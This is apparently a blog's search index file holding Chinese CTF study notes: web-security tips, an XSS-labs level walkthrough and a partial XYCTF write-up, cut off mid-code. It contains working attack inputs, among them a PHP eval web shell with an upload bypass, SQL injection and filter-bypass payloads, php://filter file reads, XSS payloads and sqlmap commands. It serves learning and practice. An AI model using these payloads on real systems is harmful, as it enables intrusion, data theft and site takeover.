<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>杂记</title>
    <link href="/kele6.github.io/2024/04/15/%E6%9D%82%E8%AE%B0/"/>
    <url>/kele6.github.io/2024/04/15/%E6%9D%82%E8%AE%B0/</url>
    
    <content type="html"><![CDATA[<h1 id="HTTP"><a href="#HTTP" class="headerlink" title="HTTP"></a>HTTP</h1><p>本地访问</p><p>X-Real-Ip:<br>X-Forwarded-For:<br>Client-Ip:</p><p>代理（从哪个网站）</p><p>Via:</p><p>Referer(从哪个网站)</p><p>User-Agent（从哪个浏览器）</p><h1 id="反序列化—魔术方法"><a href="#反序列化—魔术方法" class="headerlink" title="反序列化—魔术方法"></a>反序列化—魔术方法</h1><p>__construct()       &#x2F;&#x2F;类的构造函数，创建对象时触发</p><p>__destruct()        &#x2F;&#x2F;类的析构函数，对象被销毁时触发</p><p>__call()            &#x2F;&#x2F;调用对象不可访问、不存在的方法时触发</p><p>__callStatic()     &#x2F;&#x2F;在静态上下文中调用不可访问的方法时触发</p><p>__get()            &#x2F;&#x2F;调用不可访问、不存在的对象成员属性时触发</p><p>__set()           &#x2F;&#x2F;在给不可访问、不存在的对象成员属性赋值时触发</p><p>__isset()         &#x2F;&#x2F;当对不可访问属性调用isset()或empty()时触发</p><p>__unset()         &#x2F;&#x2F;在不可访问的属性上使用unset()时触发</p><p>__invoke()        &#x2F;&#x2F;把对象当初函数调用时触发</p><p>__sleep()        &#x2F;&#x2F;执行serialize()时，先会调用这个方法</p><p>__wakeup()       &#x2F;&#x2F;执行unserialize()时，先会调用这个方法</p><p>__toString()     &#x2F;&#x2F;把对象当成字符串调用时触发</p><p>__clone()        &#x2F;&#x2F;使用clone关键字拷贝完一个对象后触发</p><h1 id="CRLF攻击"><a href="#CRLF攻击" class="headerlink" title="CRLF攻击"></a>CRLF攻击</h1><p>资料链接： <a href="https://www.cnblogs.com/studyskill/p/6972576.html">https://www.cnblogs.com/studyskill/p/6972576.html</a></p><p>crlf顾名思义就是其中的回车和换行，造成的漏洞是HRS漏洞</p><p>在http当中http的header和body之间就是两个crlf进行分隔的</p><p>HRS漏洞就是如果能控制HTTP消息头中的字符，注入一些恶意的换行，这样就能注入一些会话cookie和html代码，所以crlf injection 又叫做 HTTP response Splitting</p><p>HRS漏洞可以造成 固定会话漏洞 和 无视filter的反射型xss漏洞</p><p>原理 一般网站会在HTTP头中用Location: <a href="http://baidu.com这种方式来进行302跳转，所以我们能控制的内容就是Location:后面的XXX某个网址，对这个地址进行污染。">http://baidu.com这种方式来进行302跳转，所以我们能控制的内容就是Location:后面的XXX某个网址，对这个地址进行污染。</a></p><p>HRS漏洞存在的前提是 ：url当中输入的字符会影响到文件，比如在重定位当中可以尝试使用%0d%0a作为crlf，</p><p>利用方式：连续使用两次%0d%oa就会造成header和body之间的分离。就可以在其中插入xss代码形成反射型xss漏洞（如何做到无视filiter？）</p><p>如何绕过服务端的filiter(xss漏洞)</p><p>1，可以在header当中注入另外的字符集<code>&lt;meta charset=ISO-2022-KR&gt;</code></p><p>使用%0f进行标记，之后的字符就不会过滤</p><p>2，可以注入一个X-XSS-Protection:0就不会被拦截了</p><p>使用一次%0d%0a就可以注入其http header当中的代码比如注入set-cookie信息造成会话固定漏洞</p><p>防范方式：在url当中过滤%0a%0d的字符，致使其不能进行转换，或者使其不能进行污染</p><h1 id="杂"><a href="#杂" class="headerlink" title="杂"></a>杂</h1><p>1.$a !&#x3D; $b &amp;&amp; md5($a) &#x3D;&#x3D; md5($b)———-a&#x3D;240610708&amp;b&#x3D;s878926199a——弱类型</p><p>2.$ver1!&#x3D;ver2—————–ver1[]&#x3D;1&amp;ver2[]&#x3D;2</p><p>3.md和md5后都是以0e开头的字符串：（数字）：240610708 &#x3D;&#x3D;&gt;md5&#x3D;&#x3D;&gt; 0e462097431906509019562988736854</p><p>CbDLytmyGm2xQyaLNhWn</p><p>770hQgrBOjrcqftrlaZk</p><p>7r4lGXCH2Ksu2JNT3BYM</p><p>QNKCDZO</p><p>0e830400451993494058024219903391</p><p>s878926199a</p><p>0e545993274517709034328855841020</p><p>s155964671a</p><p>0e342768416822451524974117254469</p><p>s214587387a</p><p>0e848240448830537924465865611904</p><p>s214587387a</p><p>0e848240448830537924465865611904</p><p>s878926199a</p><p>0e545993274517709034328855841020</p><p>s1091221200a</p><p>0e940624217856561557816327384675</p><p>s1885207154a</p><p>0e509367213418206700842008763514</p><h4 id="a-md5-a"><a href="#a-md5-a" class="headerlink" title="*$a&#x3D;&#x3D;md5($a)*"></a><em><strong>*$a&#x3D;&#x3D;md5($a)*</strong></em></h4><p>0e215962017      &#x3D;&#x3D;&gt; 0e291242476940776845150308577824</p><p>0e1284838308    &#x3D;&#x3D;&gt;0e708279691820928818722257405159</p><p>0e1137126905    &#x3D;&#x3D;&gt; 0e291659922323405260514745084877</p><p>0e807097110     &#x3D;&#x3D;&gt;0e318093639164485566453180786895</p><p>0e730083352     &#x3D;&#x3D;&gt;0e870635875304277170259950255928</p><h4 id="md5-a-md5-b-a-b"><a href="#md5-a-md5-b-a-b" class="headerlink" title="*md5($a)&#x3D;&#x3D;&#x3D;md5($b) &amp; $a !&#x3D; $b*"></a><em><strong>*md5($a)&#x3D;&#x3D;&#x3D;md5($b) &amp; $a !&#x3D; $b*</strong></em></h4><p>(1)数组绕过<br><strong>a[]&#x3D;1&amp;b[]&#x3D;2</strong></p><p>(2)两串不一样的字符，加密结果却相同：</p><p><strong>$a&#x3D;M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%02%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1%D5%5D%83%60%FB_%07%FE%A2</strong></p><p><strong>&amp;</strong></p><p><strong>$b&#x3D;M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%00%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1U%5D%83%60%FB_%07%FE%A2</strong></p><p>**(3)**构造特定字符串</p><p>4.cookie:name&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;flag————–伪协议</p><p>寻找index.php源代码:<a href="http://120.24.86.145:8005/post/index.php?file=php://filter/read=convert.base64-encode/resource=index.php">http://120.24.86.145:8005/post/index.php?file=php://filter/read=convert.base64-encode/resource=index.php</a></p><p>若不行no back，去掉read，转换成 ?filename&#x3D;php:&#x2F;&#x2F;filter&#x2F;&#x2F;convert.iconv.a.b&#x2F;resource&#x3D;flag.php<br>抓包找漏洞</p><p>5.SELECT*FROMjava.util.LinkedHashMap$EntryxWHERE(toString(x.key).contains(“app.password”))—————————mat的sql查询password</p><p>6.add header&#x3D;&#x3D;&gt;   X-Forwarded-For: 127.0.0.1  &#x2F; X-Real-Id:127.0.0.1——————本地访问</p><p>7.IP被限制&#x3D;&#x3D;&gt;数据包加入X-Forwarded-For: 127.0.0.1———————-加在账号密码上一行的上一行，上一行为空白，**但是账号密码上一行必须是空行（其实随便加进去都行，只要账号密码上空出来，即自己额外加一行）</p><p>如：</p><p>X-Forwarded-For: 127.0.0.1</p><p>username&#x3D;admin&amp;&amp;pass&#x3D;6526——————-注**：管理员的账号一定是 admin</p><p>8.只有[ 、 ] 、 ( 、 ) 、 ! 和 + 这六个字符组成的是 jspfuck（呼应题目），就是不想让别人认出自己的js代码，但浏览器可识别&#x3D;&#x3D;&gt;把那一串字符扔进浏览器的 chrome控制台就可</p><p>\9. BASE64加密的特征：包含“&#x3D;&#x3D;” </p><p>\10. str_replace 把字符串中的’key’替换为空可以使用类似这样的语句：kkeyey<br>key1可以写为  kkeyey1</p><p>\11. 常见的备份文件后缀名有: .git .svn .swp .svn .~ .bak .bash_history、11.PHP反序列化漏洞：执行unserialize()时，先会调用__wakeup()。PHP反序列化漏洞：执行unserialize()时，先会调用__wakeup()。</p><p>​    wakeup绕过：大于已知数，如O:4:”xctf”:1:{s:4:”flag”;s:3:”111”;}用O:4:”xctf”:2:{s:4:”flag”;s:3:”111”;}绕过 大于1即可</p><p>\12. 文件漏洞上传：<br><strong>一、.user.ini</strong></p><p><strong>（1）</strong>先上传.user.ini：</p><p>GIF89a          </p><p>auto_prepend_file&#x3D;a.jpg</p><p>（改包时候一定是“.user.ini”<br>  Content-Type: image&#x2F;jpg<br>）<br>   <strong>（2）</strong> 再上传a.jpg：<br>   GIF89a</p><p>​    <?=eval($_POST['cmd']);?><br>改包：“a.jgp”<br>Content-Type: image&#x2F;jpeg<br>   <strong>（3）</strong> F12查看来源：&#x2F;uploads&#x2F;index.php<br>​    <strong>(4)</strong>  用蚁剑连接 密码cmd<br>​          点”上一级“，查看更多的文件<br>**<br>**</p><p>\13. convert.iconv过滤（bp爆破字典）</p><p>filename&#x3D;php:&#x2F;&#x2F;filter&#x2F;convert.iconv.UTF-7.UCS-4*&#x2F;resource&#x3D;flag.php</p><p>\14. ?url&#x3D;&#x2F;var&#x2F;log&#x2F;nginx&#x2F;access.log<br>nginx服务器</p><p>\15. 无授权访问：</p><p> &#x2F;a.css&#x2F;..&#x2F; + 要访问的<br>如：<br>&#x2F;a.css&#x2F;..&#x2F;flag.html</p><p><strong>二、SQL</strong><br>\1.  select 被过滤<br>(1)    0’;rename table <code>words</code> to words2;rename table <code>1919810931114514</code> to words;alter table words change flag id varchar(100);show tables;#<br> 然后  1‘ or 1&#x3D;1 #（也是万能密码）</p><p>（2）  1’; handler <code>1919810931114514</code> open as <code>a</code>; handler <code>a</code> read next;#<br><strong>（表名  单引号要反着用）</strong><br>（3）  <strong>预编译：</strong><br>     concat 拼接：  -1’;set @sql &#x3D; CONCAT(‘se’,’lect * from <code>1919810931114514</code>;’);prepare stmt from @sql;EXECUTE stmt;#<br>或者<br>     1;set sql_mode&#x3D;pipes_as_concat;select 2</p><p>2.宽字节注入：<br>?id&#x3D;1%df<br>%df%27      </p><p><strong>三、sqlmap</strong>**<br>** python sqlmap.py -u  xxxxx  –dbs<br> python sqlmap.py -r post抓包文件  –dbs</p><p> python sqlmap.py -u  xxxx   –data&#x3D;”username&#x3D;1” –dbs<br>数据库  -D </p><p>表  -T  表名  -tables<br>列  -C  列名  -columns<br>字段 –dump<br>完整：<br> python sqlmap.py xxxxxxxxxxxxxxxxxxx  -D xx -T xx -C xx –dump</p><p> 另： –batch 意思是 选项全勾</p>]]></content>
    
    
    <categories>
      
      <category>练习ing</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>xss</title>
    <link href="/kele6.github.io/2024/04/15/xss/"/>
    <url>/kele6.github.io/2024/04/15/xss/</url>
    
    <content type="html"><![CDATA[<h1 id="xsslabs"><a href="#xsslabs" class="headerlink" title="xsslabs"></a>xsslabs</h1><p><em>参考链接：<a href="https://blog.csdn.net/ytdd66/article/details/136946635">https://blog.csdn.net/ytdd66/article/details/136946635</a></em></p><p><em>参考链接：<a href="https://blog.csdn.net/ytdd66/article/details/136946635">https://blog.csdn.net/ytdd66/article/details/136946635</a></em></p><h2 id="level-1—–无过滤"><a href="#level-1—–无过滤" class="headerlink" title="level-1—–无过滤"></a>level-1—–无过滤</h2><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml">无过滤直接：<span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span>alert(123);<span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure><h2 id="level-2——闭合标签"><a href="#level-2——闭合标签" class="headerlink" title="level-2——闭合标签"></a>level-2——闭合标签</h2><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml">闭合标签：&quot;&gt;<span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span>alert(123);<span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure><h2 id="level-3—–单引号闭合-js"><a href="#level-3—–单引号闭合-js" class="headerlink" title="level-3—–单引号闭合+js"></a>level-3—–单引号闭合+js</h2><p>单引号闭合+js：可能会对 “  &lt; &gt; 编码（即过滤） 可以js：’onclick&#x3D;’javascript:alert(123)’            ‘onfocus&#x3D;’javascript:alert(123)’                    ‘onblur&#x3D;’javascript:alert(123)’                     (去掉单引号就要加&#x2F;&#x2F;或者&gt;)——–被过滤就不可了 后面加 &#x2F;&#x2F;  &gt; 也是可以的</p><h2 id="level-4—–双引号闭合-js"><a href="#level-4—–双引号闭合-js" class="headerlink" title="level-4—–双引号闭合+js"></a>level-4—–双引号闭合+js</h2><p>双引号闭合+js： “onclick&#x3D;javascript:alert(1)&#x2F;&#x2F; “onclick&#x3D;’javascript:alert(1)’</p><h2 id="level-5-—–js伪协议"><a href="#level-5-—–js伪协议" class="headerlink" title="level-5 —–js伪协议"></a>level-5 —–js伪协议</h2><p>部分代码：</p><p>$str &#x3D; strtolower($_GET[“keyword”]); $str2&#x3D;str_replace(“&lt;script”,”&lt;scr_ipt”,$str); $str3&#x3D;str_replace(“on”,”o_n”,$str2);</p><p>js伪协议：发现script和on都被替换， 这一关我们利用<code>&lt;a&gt;</code>标签绕过进行绕过。 <code>&quot;&gt; &lt;a href=javascript:alert(123)&gt;xss&lt;/a&gt;</code></p><h2 id="level-6—–大小写绕过"><a href="#level-6—–大小写绕过" class="headerlink" title="level-6—–大小写绕过"></a>level-6—–大小写绕过</h2><p>大小写绕过： <code>&#39;&quot;&gt;&lt;a Href=javascript:alert(11)&gt;aa&lt;/a&gt;//</code> <code>&quot;&gt; &lt;ScripT&gt;alert(1)&lt;/ScRipT&gt;</code></p><h2 id="level-7—–双写绕过"><a href="#level-7—–双写绕过" class="headerlink" title="level-7—–双写绕过"></a>level-7—–双写绕过</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php">`<span class="hljs-meta">&lt;?php</span>` <br>`***<span class="hljs-title function_ invoke__">ini_set</span>(<span class="hljs-string">&quot;display_errors&quot;</span>, <span class="hljs-number">0</span>);***`<br>`***<span class="hljs-variable">$str</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;keyword&quot;</span>];***`<br>`***<span class="hljs-variable">$str2</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;&lt;script&quot;</span>,<span class="hljs-string">&quot;&lt;scr_ipt&quot;</span>,<span class="hljs-variable">$str</span>);***`<br>`***<span class="hljs-variable">$str3</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;on&quot;</span>,<span class="hljs-string">&quot;o_n&quot;</span>,<span class="hljs-variable">$str2</span>);***`<br>`***<span class="hljs-variable">$str4</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;src&quot;</span>,<span class="hljs-string">&quot;sr_c&quot;</span>,<span class="hljs-variable">$str3</span>);***`<br>`***<span class="hljs-variable">$str5</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;data&quot;</span>,<span class="hljs-string">&quot;da_ta&quot;</span>,<span class="hljs-variable">$str4</span>);***`<br>`***<span class="hljs-variable">$str6</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;href&quot;</span>,<span class="hljs-string">&quot;hr_ef&quot;</span>,<span class="hljs-variable">$str5</span>);***`<br></code></pre></td></tr></table></figure><p>$str2 变量通过 str_replace(“&lt;script”,”&lt;scr_ipt”,$str); 将字符串中的 &lt;script 替换为 &lt;scr_ipt，防止恶意脚本的注入。————其他的一样</p><p><strong>href被替换成空，所以我们可以想到，使用双写进行绕过</strong> <code>&quot;&gt;&lt;scrscriptipt&gt;alert(32);&lt;/scrscriptipt&gt;</code> <code>&#39;&quot;&gt;&lt;a HRhrefEF=&#39;javascrscriptipt:alert(&quot;jaden&quot;)&#39;&gt;jaden&lt;/a&gt;</code></p><h2 id="level-8—–编码绕过"><a href="#level-8—–编码绕过" class="headerlink" title="level-8—–编码绕过"></a>level-8—–编码绕过</h2><p>发现内容输出在了a标签的href属性中，当我们测试的时候发现，javascript不仅加了_，并且使用了html实体编码，将特殊符号进行了编码，导致不能进行标签闭合，那么既然内容放到了某个标签的属性值里面，我们说过，属性值是可以进行编码绕过的，尝试html实体编码绕过。 javascript:alert(“jaden”) 编码：整个进行编码 采用<em><strong>十进制ascii码</strong></em> javascript:alert(“jaden”) 或者<em><strong>十六进制unicode编码</strong></em> javascript :alert(“ja den”)</p><h2 id="level-9—–http协议校验-指定内容绕过"><a href="#level-9—–http协议校验-指定内容绕过" class="headerlink" title="level-9—–http协议校验(指定内容绕过)"></a>level-9—–http协议校验(指定内容绕过)</h2><p>发现，上面的这几种绕过方式都不行了，但是看到一个友情链接，写上一个正确的http网址可以看到输 出在了href属性中，也就是说，做了网址格式的校验，看后台代码发现其实就是http协议校验，那么我 们可以巧用js代码中的注释符号 &#x2F;&#x2F; 。</p><p>javascript:alert(“jaden”)&#x2F;&#x2F;<a href="http://www.baidu.com/">http://www.baidu.com</a> #但是前面的 javascript:alert(“jaden”)要进行编码，不然会被加上_</p><figure class="highlight prolog"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs prolog">javascript:ale&amp;<span class="hljs-string">` `</span>#<span class="hljs-number">114</span>;t(<span class="hljs-string">&quot;jaden&quot;</span>)//http://www.baidu.c<span class="hljs-string">` `</span>om<span class="hljs-string">` `</span>javascript:alert()<span class="hljs-comment">/* http:// */</span><br></code></pre></td></tr></table></figure><p><em><strong>本关小结</strong>：插入指定内容（本关是http:&#x2F;&#x2F;）绕过检测，再将指定内容用注释符注释掉即可</em> </p><h2 id="level10—–get传参，隐藏的input标签可以插入type-”text”显示"><a href="#level10—–get传参，隐藏的input标签可以插入type-”text”显示" class="headerlink" title="level10—–get传参，隐藏的input标签可以插入type&#x3D;”text”显示"></a>level10—–get传参，隐藏的input标签可以插入type&#x3D;”text”显示</h2><figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs autoit">$str = $_GET[<span class="hljs-string">&quot;keyword&quot;</span>]<span class="hljs-comment">;</span><br><br><br><br>$str11 = $_GET[<span class="hljs-string">&quot;t_sort&quot;</span>]<span class="hljs-comment">;</span><br><br><br><br>$str22=str_replace(<span class="hljs-string">&quot;&gt;&quot;</span>,<span class="hljs-string">&quot;&quot;</span>,$str11)<span class="hljs-comment">;</span><br><br><br><br>$str33=str_replace(<span class="hljs-string">&quot;&lt;&quot;</span>,<span class="hljs-string">&quot;&quot;</span>,$str22)<span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure><p>这两行代码对 $str11 变量进行字符串替换操作。首先，它移除了 $str11 中所有的 “&gt;” 字符，然后将结果存储在 $str22 中。接着，它移除了 $str22 中所有的 “&lt;” 字符，并将结果存储在 $str33 中首先，输出一个居中的 <code>&lt;h2&gt;</code> 标题，提示用户没有找到和 $str 相关的结果。这里使用htmlspecialchars() 函数来确保 $str 中的特殊字符被正确转义，接着，输出一个表单，其中包含了三个隐藏的输入字段：t_link、t_history 和 t_sort。前两个字段的值都被设置为空字符串，而第三个字段的值被设置为 $str33（即处理过的 $str11）</p><p>修改为text</p><p><strong>payload:?t_sort&#x3D;onfocus&#x3D;javascript:alert() type&#x3D;”text”</strong></p><p><em><strong>小结：根据源码猜解传参的参数名，隐藏的input标签可以插入type&#x3D;”text”显示</strong></em></p><h2 id="level-11—–referer"><a href="#level-11—–referer" class="headerlink" title="level-11—–referer"></a>level-11—–referer</h2><p><code>&lt;input&gt;</code>标签有四个值，都做了隐藏处理，不难看出，第四个名为t_ref的<code>&lt;input&gt;</code>标签是http头referer的参数（就是由啥地址转跳到这里的，http头的referer会记录有），我们先做个简单的测试来验证一下前面三个标签名，GET与POST传参都试一下看看（<strong>都不行</strong>） <strong>那应该就referer头了，用burpsuite抓包一下，添加http头</strong> Referer: “ sRc DaTa OnFocus <code>&lt;sCriPt&gt; &lt;a hReF=javascript:alert()&gt;</code> <code>j</code> 对比发现，把大于小于号&gt;&lt;给删掉了，但是我们还能用onfocus，构造一个http头： Referer: “ onfocus&#x3D;javascript:alert() type&#x3D;”text <strong>本关小结</strong>：考虑一下http头传值，本关是referer，但接下来也有可能是其他头，如Cookie等</p><h2 id="level-12—–User-Agent头"><a href="#level-12—–User-Agent头" class="headerlink" title="level-12—–User-Agent头"></a>level-12—–User-Agent头</h2><p>User-Agent: “ onfocus&#x3D;javascript:alert() type&#x3D;”text</p><h2 id="level-13—–Cookie头"><a href="#level-13—–Cookie头" class="headerlink" title="level-13—–Cookie头"></a>level-13—–Cookie头</h2><p>Cookie：” onclick&#x3D;alert() type&#x3D;”text </p><h2 id="level-14—–Pass"><a href="#level-14—–Pass" class="headerlink" title="level-14—–Pass"></a>level-14—–Pass</h2><h2 id="level-15—–ng-include文件包涵，可以无视html实体化"><a href="#level-15—–ng-include文件包涵，可以无视html实体化" class="headerlink" title="level-15—–ng-include文件包涵，可以无视html实体化"></a>level-15—–ng-include文件包涵，可以无视html实体化</h2><p>ng-include 指令用于包含外部的 HTML 文件。 包含的内容将作为指定元素的子节点。——–<em><strong>ng-include指令就是文件包涵的意思，用来包涵外部的html文件，如果包涵的内容是地址，需要加引号</strong></em> ng-include 属性的值可以是一个表达式，返回一个文件名。 默认情况下，包含的文件需要包含在同一个域名下。</p><p>语法 &lt; element  ng-include&#x3D; “filename”  οnlοad&#x3D; “expression”  autoscroll&#x3D; “expression”  &gt; &lt; &#x2F;element &gt; ng-include 指令作为元素使用:</p><p>&lt; ng-include  src&#x3D; “filename”  οnlοad&#x3D; “expression”  autoscroll&#x3D; “expression”  &gt; &lt; &#x2F;ng-include &gt; 所有的 HTML 元素都支持该指令。</p><p>参数值 值:描述 filename:文件名，可以使用表达式来返回文件名。 onload:可选， 文件载入后执行的表达式。 autoscroll:可选，包含的部分是否在指定视图上可滚动。</p><p>原文链接：<a href="https://blog.csdn.net/u011127019/article/details/53666528/">https://blog.csdn.net/u011127019/article/details/53666528/</a></p><p><strong>开始做题：</strong> <strong>1</strong>.我们先试试看包涵第一关，构建payload：?src&#x3D;’&#x2F;level1.php’ </p><p>所以可以随便包涵之前的一关并对其传参，以达到弹窗的效果，先测试一下过滤了啥，构造payload ?src&#x3D;” ‘ sRc DaTa OnFocus <code>&lt;s</code>CriPt&gt; &lt;a hReF&#x3D;javascript:alert()<code>&gt;</code> j</p><p>**2.**对比发现，这里有个html实体化函数在，没有删掉东西，所以不影响我们接下来的操作，我们可以包涵第一关并让第一关弹窗（注意，这里不能包涵那些直接弹窗的东西如<code>&lt;script&gt;</code>，但是可以包涵那些标签的东西比如<code>&lt;a&gt;、&lt;input&gt;、&lt;img&gt;、&lt;p&gt;</code>标签等等，这些标签是能需要我们手动点击弹窗的），这里我们使用img标签，可参考XSS常见的触发标签，构造payload ：?src&#x3D;’&#x2F;level1.php?name&#x3D;&lt;img src&#x3D;1 onmouseover&#x3D;alert()&gt;’ **3.**当鼠标移动到图片的时候就触发了弹窗 </p><p>当然也能用p标签，可以构造payload：?src&#x3D;’&#x2F;level1.php?name&#x3D;<code>&lt;</code>p onmousedown&#x3D;alert()&gt;哈哈哈&lt;&#x2F;p<code>&gt;</code>‘ 点击哈哈哈即可弹窗，接下来我们看一下这关的后端源码 </p><h2 id="level-16—–回车代替空格绕过检测"><a href="#level-16—–回车代替空格绕过检测" class="headerlink" title="level-16—–回车代替空格绕过检测"></a>level-16—–回车代替空格绕过检测</h2><p>1.test插入到了center标签中，所以这里就不用闭合了，老规矩，先测试一波关键字：?<code>keyword=&quot; &#39; sRc DaTa OnFocus OnmOuseOver OnMouseDoWn P &lt;sCriPt&gt; &lt;a hReF=javascript:alert()&gt; j</code>  <code>.Kht.m.1..….g...app&gt;2 &lt;head&gt;</code> <code>3</code></p><p>&lt;body<code>&gt;</code>span class&#x3D;”ng-include:” ’sRc DaTa OnFocus &lt;sCriPtgt; 6lt;a hReF&#x3D;-javascript:alert()kgt ; “Xlspan(&#x2F;body 18</p><p>**2.**对比发现，这里先是将字母小写化了，再把script替换成空格，最后将空格给实体化，想尝试一下p标签&lt;p οnmοusedοwn&#x3D;alert()&gt;abc&lt;&#x2F;p<code>&gt;</code>，谁知道也将&#x2F;给替换成了空格，无奈，只好看一下后端源码 <code>$str2=str_replace(&quot;script&quot; , &quot; &quot;,$str);</code> $str3&#x3D;str_replace(“ “, “ “ ,$str2); $str4&#x3D;str_replace(“&#x2F;“, “ “,$str3); $str5&#x3D;str_replace(“ “, “ “ ,$str4); echo “<code>&lt;center&gt;</code>“.$str5.”<code>&lt;/center</code>&gt;”;?&gt;&#96;</p><p>**3.**果然给过掉了，空格可以用回车来代替绕过，回车的url编码是%0a，再配合上不用&#x2F;的<code>&lt;img&gt;、&lt;details&gt;、&lt;svg&gt;</code>等标签，更多标签可参考<a href="https://blog.csdn.net/LYJ20010728/article/details/116462782">XSS常见的触发标签</a></p><p>随便选个标签，将空格替换成回车的url编码，构造payload  ?keyword&#x3D;&lt;svg%0Aonload&#x3D;alert(1)&gt;</p><h2 id="level-17—–embed标签"><a href="#level-17—–embed标签" class="headerlink" title="level-17—–embed标签"></a>level-17—–embed标签</h2><p><code>&lt;e</code>mbed src&#x3D;”xsf01.swf ?a&#x3D;b” width&#x3D;”100%” heigth&#x3D;”100%”&gt; </p><p>这个传入了两个值，分别作为src中的xsf01.swf的变量和值传入,观察一下发现这个embed  标签就是引入一个  swf  文件到浏览器端，并且它的  src  属性值没有添 </p><p>  加引号所以 不用闭合。 </p><p>构造payload     ‘ οnclick&#x3D;alert()</p><h2 id="level-18—–同17"><a href="#level-18—–同17" class="headerlink" title="level-18—–同17"></a>level-18—–同17</h2><h2 id="level-19—–Pass"><a href="#level-19—–Pass" class="headerlink" title="level-19—–Pass"></a>level-19—–Pass</h2><h2 id="level-20—–Pass"><a href="#level-20—–Pass" class="headerlink" title="level-20—–Pass"></a>level-20—–Pass</h2>]]></content>
    
    
    <categories>
      
      <category>练习ing</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>XYCTF</title>
    <link href="/kele6.github.io/2024/04/14/XYCTF/"/>
    <url>/kele6.github.io/2024/04/14/XYCTF/</url>
    
    <content type="html"><![CDATA[<h1 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h1><h2 id="ezhttp"><a href="#ezhttp" class="headerlink" title="ezhttp"></a>ezhttp</h2><p>源代码发现：为了防止忘记密码，我把它们放在某个地方了<br>信息泄露：robots.txt<br>发现 Disallow: &#x2F;l0g1n.txt &#x3D;&#x3D;&gt; 得到账号密码<br>不是 yuanshen.com 来的我不要 &#x3D;&#x3D;&gt;<strong>Referer: yuanshen.com</strong><br>你用的不是XYCTF的浏览器&#x3D;&#x3D;&gt; <strong>User-Agent: XYCTF</strong><br>非本地用户禁止访问！ &#x3D;&#x3D;&gt;<strong>X-Forwarded-For: 127.0.0.1    X-Real-Ip: 127.0.0.1  (这两个都行不通)</strong><br>最终： <strong>Client-Ip: 127.0.0.1</strong><br>不是从 ymzx.qq.com 代理来的我不玩&#x3D;&#x3D;&gt;<strong>Via: ymzx.qq.com</strong><br>有点饿，想吃点XYCTF的小饼干&#x3D;&#x3D;&gt;<strong>Cookies: XYCTF</strong><br>———<strong>冒号后面加空格！！！*（尤其是hackbar）</strong><br><em>OVER</em></p><h2 id="Warm-Up"><a href="#Warm-Up" class="headerlink" title="Warm Up"></a>Warm Up</h2><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">$_GET<span class="hljs-selector-attr">[<span class="hljs-string">&#x27;val1&#x27;</span>]</span> != $_GET<span class="hljs-selector-attr">[<span class="hljs-string">&#x27;val2&#x27;</span>]</span> &amp;&amp; <span class="hljs-built_in">md5</span>($_GET<span class="hljs-selector-attr">[<span class="hljs-string">&#x27;val1&#x27;</span>]</span>) == <span class="hljs-built_in">md5</span>($_GET<span class="hljs-selector-attr">[<span class="hljs-string">&#x27;val2&#x27;</span>]</span><br></code></pre></td></tr></table></figure><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">isset</span><span class="hljs-params">(<span class="hljs-variable">$md5</span>)</span></span> &amp;&amp; <span class="hljs-variable">$md5</span> == <span class="hljs-built_in">md5</span>(<span class="hljs-variable">$md5</span>)<br></code></pre></td></tr></table></figure><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-variable">$XY</span> != <span class="hljs-string">&quot;XYCTF_550102591&quot;</span> &amp;&amp; <span class="hljs-built_in">md5</span>(<span class="hljs-variable">$XY</span>) == <span class="hljs-built_in">md5</span>(<span 